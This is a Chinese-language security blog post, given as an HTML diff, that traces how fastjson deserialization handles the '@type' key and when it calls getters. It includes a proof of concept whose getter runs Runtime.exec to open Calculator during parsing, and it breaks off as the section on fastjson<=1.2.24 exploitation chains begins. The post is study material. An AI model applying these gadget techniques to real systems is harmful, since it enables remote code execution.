+<h3 id="type属性说明">@type属性说明</h3>
+<p>在前面我们都是对一个类进行的json序列化和反序列化，从而可以获取并调用到对应类的getter和setter，但是既然都是获取getter了，那么肯定是要尝试常见的Templates链，那么怎么可以指定一个类的序列化呢？这就与<code>@type</code>属性有关了，这个属性可以直接解析指定的类，我们可以进行如下尝试：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="s">&#34;{\&#34;user_age\&#34;:1233,\&#34;user_name\&#34;:\&#34;fupanc\&#34;}&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>简单调试理解一下，可以知道这里大概就是一个将String类型的json字符串给解析成一个JSONObject对象，对象存在如下内容：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409170705211.png" alt="image-20250409170705211"></p>
+<p>那么但是这样就不能将其解析为一个对象了，和我们之前分析的有很大区别，这里就需要利用到<code>@type</code>这个属性了，如下测试：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.annotation.JSONField</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;fastjson.Person\&#34;,\&#34;user_age\&#34;:1233,\&#34;user_name\&#34;:\&#34;fupanc\&#34;}&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_name&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_age&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>其实主要就是前面部分有点区别，后面部分和前面调试分析的反序列化过程就很想像了，我们还是打断点于parseObject()方法，然后会调用parse()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409174420111.png" alt="image-20250409174420111"></p>
+<p>持续跟进重载的parse()方法，如下的代码处理是最关键的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409174521689.png" alt="image-20250409174521689"></p>
+<p>会调用DefaultJSONParser类的parse()方法，然后就给出关键部分吧，过程涉及到的类比较多，还是给一个调用栈就行了，自己调试一下过程即可，到如下关键代码处：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409174849532.png" alt="image-20250409174849532"></p>
+<p>这里会调用TypeUtils类的loadClass()方法，注意一下这里条件的满足，需要key为<code>@type</code>等，并且这里实际是调用类加载器来加载Person类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409175041098.png" alt="image-20250409175041098"></p>
+<p>调用栈如下：</p>
+<pre tabindex="0"><code>loadClass:1032, TypeUtils (com.alibaba.fastjson.util)
+parseObject:322, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
+parse:137, JSON (com.alibaba.fastjson)
+parse:128, JSON (com.alibaba.fastjson)
+parseObject:201, JSON (com.alibaba.fastjson)
+main:10, Fastjson_Test (fastjson)
+</code></pre><p>在返回了这个Class对象后，然后又跟进，到如下代码：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409175133681.png" alt="image-20250409175133681"></p>
+<p>这里不就是前面反序列化时的代码吗，所以是可以调用到setter方法的，就不分析了，可以成功获取到Person类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409175412810.png" alt="image-20250409175412810"></p>
+<p>所以最后还是返回的这个Person类对象，只是将其转换成了JSON对象：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173223899.png" alt="image-20250409173223899"></p>
+<p>而在这个toJSON方法中，又存在前面分析的序列化过程，跟进这个toJSON()方法，在后续重载的toJSON()方法中，调用到了如下方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173618827.png" alt="image-20250409173618827"></p>
+<p>一直往后面跟可以知道就是前面的序列化过程，这里就不多说了，最后获取到的对象如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173813303.png" alt="image-20250409173813303"></p>
+<p>继续往后面看：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173954687.png" alt="image-20250409173954687"></p>
+<p>这里的getFieldValuesMap()方法就是调用getter来获取值，然后以键值对形式放入JSONObject中，最后返回了JSONObject实例，也就是最后调用parseObject()获取到的东西。</p>
+<p>从上面的整个过程来看，即调用了setter，还调用了getter，后面从几个版本来来看看这里的利用点。</p>
+<p><strong>这里还有个点不得不说明</strong>：fastjson 在反序列化时，如果 Field 类型为 <code>byte[]</code>，将会调用<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。具体体现就在后面的例子中说明。</p>
+<p>还有些其他要求，这里就不多说了，看后面的调用链，并且其实在前面的代码调试分析中都是有体现的，只是没细说。</p>
+<h3 id="补充说明">补充说明</h3>
+<p>主要是补充前面遗漏的一个细节，在前面的分析中，也是提到了一个点，在反序列化的时候，除了会调用setter，还会处理getter，在一定情况下，<strong>这个的getter利用是非常关键且重要的</strong>，我们还是以上面反序列化的代码进行测试，分析几个必要的条件，然后再给出一个例子来进行证明，分析代码还是如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.annotation.JSONField</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">1233</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====序列化=====&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">person</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//反序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====反序列化=====&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_name&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_age&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>这里就直接聚焦于反序列化了，其实重点就是两个地方，方法的获取以及调用，对于方法的获取，在前面都是提到了，对于方法的调用是一笔带过的，这里具体分析一下，当时提到了会有对getter方法的处理，因为我们这里获取方法是直接调用的<code>getMethods()</code>来进行的，这里先从反序列化调用setter的代码来看，基本的调用是差不多的：</p>
+<p>在取方法并进行调用的代码位于：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210414182.png" alt="image-20250411210414182"></p>
+<p>在setValue()方法的调用：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210639587.png" alt="image-20250411210639587"></p>
+<p>也就是前面传递的fieldInfo变量，此时的变量定义如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210731435.png" alt="image-20250411210731435"></p>
+<p>最后是再调用的invoke()方法来进行的方法调用：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210820988.png" alt="image-20250411210820988"></p>
+<p>调用栈为：</p>
+<pre tabindex="0"><code>setAge:42, Person (fastjson)
+invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
+invoke:62, NativeMethodAccessorImpl (sun.reflect)
+invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
+invoke:497, Method (java.lang.reflect)
+setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
+deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
+parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
+parseObject:339, JSON (com.alibaba.fastjson)
+parseObject:243, JSON (com.alibaba.fastjson)
+parseObject:456, JSON (com.alibaba.fastjson)
+main:18, Fastjson_Test (fastjson)
+</code></pre><p>我们再来看一下关键的sortedFieldDeserializers变量的赋值的地方：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411210215683.png" alt="image-20250411210215683"></p>
+<p>其实就是sortedFields，也就是上面的<code>JavaBeanInfo.build()</code>方法调用的类变量的结果：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411211223545.png" alt="image-20250411211223545"></p>
+<p>具体实现在：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411211354987.png" alt="image-20250411211354987"></p>
+<p>这里也是前面标注出来的，数组copy过程，这里就涉及到了一个非常重要的变量：<code>fielList</code> ，也是形参传递的一个变量，回过去看这个变量的赋值情况，可以发现主要是通过下面这个方法来进行赋值的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411211956349.png" alt="image-20250411211956349"></p>
+<p>并且这个是存在于处理getter方法的逻辑中的，我们去看一下需要处理的条件：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411212246987.png" alt="image-20250411212246987"></p>
+<p><strong>方法名字长度得大于4，然后不能是静态方法，然后需要以get开头</strong>，还有条件如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411212347411.png" alt="image-20250411212347411"></p>
+<p>需要满足这个方法的<strong>返回值是这几个类型中的其中一个</strong>才能进入后面的条件，并且还需要这个变量没有setter，只有getter ：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411214506898.png" alt="image-20250411214506898"></p>
+<p>跟进这里关键的getField()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411214547418.png" alt="image-20250411214547418"></p>
+<p>从上面的代码可以看出来，这里需要返回null，看这里的代码逻辑，就是判断这个fieldList是否有相同的字段名称，而在前面的fieldList赋值逻辑中，是先处理的setter，然后才是处理的getter，为了这里能返回null，所以<strong>需要这个字段没有setter</strong>，这fieldList中才不会有这个&quot;name&quot; ，基于上面的条件，可以进行如下代码测试：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Person</span><span class="p">)</span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="s">&#34;{\&#34;map\&#34;:{}}&#34;</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="nf">getMap</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="s">&#34;open -a Calculator&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>运行成功弹出计算机。如下几个点说明：</p>
+<ul>
+<li>为什么是反序列化的<code>{&quot;map&quot;:{}}</code>，其实这个点是在下面的fastjson&lt;=1.2.24的TemplatesImpl链说过的，也就是如果json字符串没有对变量进行赋值，fastjson会获取这个变量的默认类型的无参构造方法进行实例化然后赋值。</li>
+<li>然后就再调试看一下这里的getter方法的调用代码实现，前面都还是差不多的，利用点变了：</li>
+</ul>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411220309400.png" alt="image-20250411220309400"></p>
+<p>跟进这个parseField()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411220549989.png" alt="image-20250411220549989"></p>
+<p>这里还是会调用到setValue()方法：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250411220702606.png" alt="image-20250411220702606"></p>
+<p>最后还是成功调用invoke()方法从而调用getMap()方法从而弹出计算机。</p>
+<h2 id="利用链学习">利用链学习</h2>
+<h3 id="fastjson1224">fastjson&lt;=1.2.24</h3>
+<p>两条链子，这里来调试分析一下，依赖为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
